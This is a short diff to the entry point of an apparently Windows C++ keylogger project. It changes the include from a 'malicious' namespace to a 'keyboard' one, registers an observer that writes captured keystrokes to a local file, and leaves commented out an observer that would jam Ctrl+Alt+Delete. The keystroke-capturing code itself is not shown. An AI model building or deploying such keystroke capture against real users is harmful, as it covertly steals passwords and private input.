@@ -1,8 +1,15 @@
 #include <log/Log.hpp>
-#include <malicious/Keylogger.hpp>
+#include <keyboard/Keylogger.hpp>
+#include <keyboard/KeyLogObserver.hpp>
+#include <keyboard/JamKeyObserver.hpp>
+
+using namespace Keyboard;
 #include <system/Process.hpp>
 #include <common/ParseOptions.hpp>
 #include <audit/Audit.hpp>
+
+#include <cstdio>
+#include <windows.h>
 
 int submain(int argc, char ** argv)
 {
@@ -10,8 +17,15 @@ int submain(int argc, char ** argv)
 	{
 		LOG.setIdentity(Common::identity);
 		Common::ParseOptions(argc, argv);
-		Malicious::Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
-		Malicious::Keylogger::instance().start();
+
+		KeyCombination keys;
+		keys.push_back(VK_LMENU);
+		keys.push_back(VK_LCONTROL);
+		keys.push_back(VK_DELETE);
+
+		Keylogger::instance().addObserver(new KeyLogObserver("C:\\Users\\crunch\\keylog.txt"));
+		//Keylogger::instance().addObserver(new JamKeyObserver(keys));
+		Keylogger::instance().start();
 	}
 	catch(Common::Exception&)
 	{
